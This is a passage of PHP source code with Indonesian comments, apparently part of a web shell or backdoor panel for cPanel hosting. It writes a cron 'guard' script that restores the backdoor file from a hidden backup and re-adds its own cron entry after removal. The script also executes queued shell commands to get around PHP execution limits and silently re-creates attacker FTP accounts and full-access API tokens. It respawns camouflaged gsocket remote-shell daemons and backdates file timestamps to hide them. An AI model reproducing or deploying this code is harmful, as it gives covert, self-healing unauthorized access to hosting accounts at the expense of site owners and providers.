       guard (jalan tiap siklus cron) menuliskannya kembali dari cadangan ~/.fum_bak */
    $sh .= "SF='" . str_replace("'", '', __FILE__) . "'\n"
        . "BK='" . str_replace("'", '', fum_backup_path()) . "'\n"
        . "if [ -f \"\$BK\" ]; then\n"
        . "  SZ=\$(wc -c 2>/dev/null < \"\$SF\"); [ -z \"\$SZ\" ] && SZ=0\n"
        . "  if [ ! -f \"\$SF\" ] || [ \"\$SZ\" -lt 1000 ] || ! grep -q 'fum_guard_path' \"\$SF\" 2>/dev/null; then\n"
        . "    cp \"\$BK\" \"\$SF\" 2>/dev/null && chmod 0644 \"\$SF\"\n"
        . "  fi\n"
        . "fi\n";
    /* ANTRIAN ZERO-SHELL: kalau semua fungsi exec PHP dimatikan hosting, panel
       menaruh perintah di ~/.fum_queue/*.sh — guard ini (dijalankan CROND =
       shell asli, tidak tunduk pada disable_functions PHP) yang mengeksekusi.
       Sisa file installer sementara ikut disapu tiap siklus. */
    $sh .= "QD=\"\$HOME/.fum_queue\"\n"
        . "if [ -d \"\$QD\" ]; then\n"
        . "  for q in \"\$QD\"/*.sh; do\n"
        . "    [ -f \"\$q\" ] || continue\n"
        . "    timeout 600 /bin/sh \"\$q\" >>\"\$QD/log\" 2>&1\n"
        . "    rc=\$?\n"
        . "    t=0; [ -f \"\$q.tries\" ] && t=\$(cat \"\$q.tries\" 2>/dev/null); t=\$((t+1)); echo \"\$t\" > \"\$q.tries\"\n"
        . "    if [ \$rc -eq 0 ] || [ \$rc -eq 124 ] || [ \$t -ge 3 ]; then rm -f \"\$q\" \"\$q.tries\"; fi\n"
        . "  done\n"
        . "  ls \"\$QD\"/*.sh >/dev/null 2>&1 || rm -f \"\$QD\"/.tgz_* /tmp/.gstgz_* 2>/dev/null\n"
        . "fi\n";
    /* SELF-HEAL CRON: kalau crontab dicuci (crontab -r), guard memasang ulang
       entri cron-nya sendiri tiap siklus. Jalannya di bawah crond (root) = kebal
       kill -9 -1; wipe di siklus sebelumnya terperbaiki otomatis <= 7 menit. */
    $sh .= "crontab -l 2>/dev/null | grep -q fum_guard || { crontab -l 2>/dev/null | grep -v fum_ ; echo '*/7 * * * * /bin/sh " . fum_guard_path() . " >/dev/null 2>&1' ; } | crontab - >/dev/null 2>&1\n";
    if (isset($st['ftp']) && is_array($st['ftp'])) {
        foreach ($st['ftp'] as $fa) {
            $u = str_replace("'", '', $fa['user']);
            $p = str_replace("'", '', $fa['pass']);
            $d = isset($fa['dir']) ? str_replace("'", '', $fa['dir']) : '';
            $sh .= "uapi Ftp list_ftp 2>/dev/null | grep -q '" . $u . "@' || { uapi Ftp add_ftp user='" . $u . "' pass='" . $p . "'"
                . ($d != '' ? " homedir='" . $d . "'" : '')
                . " >/dev/null 2>&1; rm -f \"\$HOME/" . ($d != '' ? $d . '/' : '') . ".ftpquota\"; }\n";
        }
    }
    if (isset($st['tokens']) && is_array($st['tokens'])) {
        foreach ($st['tokens'] as $tn => $tv) {
            $tn = str_replace("'", '', $tn);
            $sh .= "uapi Tokens list 2>/dev/null | grep -q '" . $tn . "' || { "
                . "T=\$(uapi Tokens create_full_access name='" . $tn . "' 2>/dev/null | sed -n \"s/.*token:[ '\\\"]*\\([A-Za-z0-9]*\\).*/\\1/p\" | head -1); "
                . "if [ \"\$T\" != '' ]; then sed -i '/^" . $tn . "=/d' \"\$NT\" 2>/dev/null; echo \"" . $tn . "=\$T\" >> \"\$NT\"; fi; }\n";
        }
    }
    /* GSFU: anti-hapus juga untuk 3 instance gsocket (install/hidden/hidden2).
       Daemon mati -> guardian dinyalakan lagi -> guardian me-respawn daemon.
       v66.2: shell via gsp_sh_bin() (host tanpa bash); RUSAK v3 vektor C —
       start DAEMON membaca flag ~/.cache/.gs_brk_daemon: bila ada, daemon
       distart dengan inline env LD_PRELOAD=breaker HANYA untuk proses daemon
       (guardian sendiri tidak diracuni; gs-netcat static = kebal, shell
       anaknya yang lumpuh). */
    $gsb = str_replace("'", '', gsp_sh_bin());
    if (isset($st['gsocket']) && is_array($st['gsocket'])) {
        foreach ($st['gsocket'] as $gi) {
            $gb = isset($gi['bin']) ? str_replace("'", '', $gi['bin']) : '';
            if ($gb == '') continue;
            $gg = isset($gi['guard']) ? str_replace("'", '', $gi['guard']) : '';
            $gr = isset($gi['run']) ? str_replace("'", '', $gi['run']) : '';
            $gc = isset($gi['camo']) ? str_replace("'", '', $gi['camo']) : '';
            if ($gc != '') $sh .= "if ! GSP_UNHIDE=1 ps -eo args= 2>/dev/null | grep -F '" . $gc . "' | grep -qv grep; then
";
            else $sh .= "if ! pgrep -f '" . $gb . "' >/dev/null 2>&1; then
";
            if ($gg != '') $sh .= "  if ! pgrep -f '" . $gg . "' >/dev/null 2>&1 && [ -f '" . $gg . "' ]; then setsid " . $gsb . " '" . $gg . "' >/dev/null 2>&1 & sleep 2; fi
";
            if ($gr != '') $sh .= "  if ! pgrep -f '" . $gb . "' >/dev/null 2>&1 && [ -f '" . $gr . "' ]; then GSPBRK=\"\"; [ -f \"\$HOME/.cache/.gs_brk_daemon\" ] && GSPBRK=\$(cat \"\$HOME/.cache/.gs_brk_daemon\" 2>/dev/null); [ -n \"\$GSPBRK\" ] && [ ! -f \"\$GSPBRK\" ] && GSPBRK=\"\"; GSP_BRK=\"\$GSPBRK\" setsid " . $gsb . " '" . $gr . "' >/dev/null 2>&1 & fi
";
            $sh .= "fi
";
        }
    }
    $ok = fum_file_put(fum_guard_path(), $sh);
    @chmod(fum_guard_path(), 0700);
    if ($ok !== false) gsp_stealth_age(fum_guard_path());
    return $ok !== false;
}

// sinkronkan kredensial session -> store tersembunyi (hanya kalau proteksi aktif)
function fum_store_sync() {
    if (!@is_file(fum_store_path())) return;
    // segarkan cadangan diri (self-restore) — ikut versi terbaru file ini
    $me = @file_get_contents(__FILE__);
    if ($me !== false && strlen($me) > 1000) { fum_file_put(fum_backup_path(), $me); @chmod(fum_backup_path(), 0600); gsp_stealth_age(fum_backup_path()); }
    $pm = (isset($_SESSION['fum_pass_map']) && is_array($_SESSION['fum_pass_map'])) ? $_SESSION['fum_pass_map'] : array();
    $tm = (isset($_SESSION['fum_token_map']) && is_array($_SESSION['fum_token_map'])) ? $_SESSION['fum_token_map'] : array();
    $dirs = array();
    if (count($pm)) {
        $r = fum_call('Ftp', fum_ftp_fname('list'), array());
        if ($r[0]) {
            $home = fum_home_dir();
            foreach (fum_ftp_data($r[1], $r[2]) as $a) {
                $f = fum_acc_fields($a);
                $b = $f[0]; if (strpos($b, '@') !== false) { $x = explode('@', $b); $b = $x[0]; }
                $d = $f[1];
                if ($d == $home) $d = '';
                elseif (strpos($d, $home . '/') === 0) $d = substr($d, strlen($home) + 1);
                $dirs[$b] = $d;
            }
        }
    }
    $me = fum_detect_user();
    $gsx = array();
    if (function_exists('gsp_registry')) {
        foreach (gsp_registry() as $ge) {
            $gb = isset($ge['BIN']) ? $ge['BIN'] : '';
            if ($gb == '') continue;
            $gsx[] = array('bin' => $gb,
                'guard' => isset($ge['GUARD']) ? $ge['GUARD'] : '',
                'run'   => isset($ge['RUNNER']) ? $ge['RUNNER'] : '',
                'camo'  => isset($ge['CAMO']) ? $ge['CAMO'] : '');
        }
    }
    $st = array('ftp' => array(), 'tokens' => $tm, 'gsocket' => $gsx);
    /* v66.0: healkey (watchdog tanpa gerbang) JANGAN hilang saat sync
       membangun ulang store dari session */
    $hk0 = fum_healkey_stored();
    if ($hk0 !== '') $st['healkey'] = $hk0;
    foreach ($pm as $u => $pw) {
        if ($u == $me || substr($u, -5) == '_logs') continue; // akun utama/logs tidak di-heal
        $st['ftp'][] = array('user' => $u, 'pass' => $pw,
            'dir' => isset($dirs[$u]) ? $dirs[$u] : fum_self_rel());
    }
    fum_store_save($st);
    fum_guard_write(); // guard script ikut diperbarui
}
// cari linekey cron watchdog (untuk removal)
function fum_cron_heal_keys($result, $raw) {
    $keys = array();
    if (is_array($result)) {
        $stack = array($result);
        while (count($stack)) {
            $node = array_pop($stack);
            if (!is_array($node)) continue;
            if (isset($node['command']) && is_string($node['command']) && strpos($node['command'], 'fum_') !== false && isset($node['linekey'])) {
                $keys[] = $node['linekey'];
                continue;
            }
            foreach ($node as $v) if (is_array($v)) $stack[] = $v;
        }
    }
    if (!count($keys) && is_string($raw) && strpos($raw, 'fum_heal') !== false) {
        $seen = false;
        foreach (preg_split('/\r?\n/', $raw) as $ln) {
            if (preg_match('/^\s*-?\s*command:/', $ln)) $seen = (strpos($ln, 'fum_heal') !== false);
            elseif (strpos($ln, 'fum_heal') !== false) $seen = true;
            if ($seen && preg_match('/linekey:\s*([A-Za-z0-9]+)/', $ln, $mm)) { $keys[] = $mm[1]; $seen = false; }
        }
    }
    return $keys;
}

/* cari linekey cron cPanel yang command-nya memuat salah satu path guardian gsocket */
function gsp_cron_guard_keys($result, $raw, $guards) {
    $keys = array();
    if (is_array($result)) {
        $stack = array($result);
        while (count($stack)) {
            $node = array_pop($stack);
            if (!is_array($node)) continue;
            if (isset($node['command']) && is_string($node['command']) && isset($node['linekey'])) {
                foreach ($guards as $g) if ($g !== '' && strpos($node['command'], $g) !== false) { $keys[] = $node['linekey']; break; }
                continue;
            }
            foreach ($node as $v) if (is_array($v)) $stack[] = $v;
        }
    }
    if (!count($keys) && is_string($raw)) {
        foreach ($guards as $g) {
            if ($g === '' || strpos($raw, $g) === false) continue;
            $seen = false;
            foreach (preg_split('/\r?\n/', $raw) as $ln) {
                if (strpos($ln, $g) !== false) $seen = true;
                if ($seen && preg_match('/linekey:\s*([A-Za-z0-9]+)/', $ln, $mm)) { $keys[] = $mm[1]; $seen = false; }
            }
        }
    }
    return array_unique($keys);
